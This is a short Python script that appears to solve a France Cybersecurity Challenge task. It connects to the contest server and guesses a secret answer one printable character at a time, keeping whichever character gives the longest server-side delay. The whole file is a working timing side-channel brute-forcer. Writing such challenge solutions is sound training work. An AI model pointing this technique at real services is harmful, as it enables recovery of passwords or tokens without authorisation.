import socket as s
import re
import time

host = "challenges.france-cybersecurity-challenge.fr"
port = 2350

charlist = []

for i in range(32, 127):
    charlist.append(chr(i))


def Rabbit():
    sock = s.socket(s.AF_INET, s.SOCK_STREAM)
    print("Socket created")

    sock.connect((host, port))
    print("Connection opened with host", host, "on port", port, "\n")

    res = ""
    data = ""
    best = 0
    l = ''
    timer = 1

    while True :
        best = 0
        exit = False
        for c in charlist:
            while 'Answer' not in data:
                data = sock.recv(1024).decode()
                if not data or len(data) == 0:
                    break
                print(data)

            sock.send((res + c + '\n').encode())

            time.sleep(timer)
            data = sock.recv(1024).decode()

            timestamp = re.findall("[0-9]+", data)

            time1 = timestamp[0]
            time2 = timestamp[1]
            chrono = int(time2) - int(time1)

            if (chrono > best):
                best = chrono
                l = c

            print(res + c + " ("+str(chrono)+')', end='\r')

        res = res + l
    sock.close()
    print("Connection closed")

Rabbit()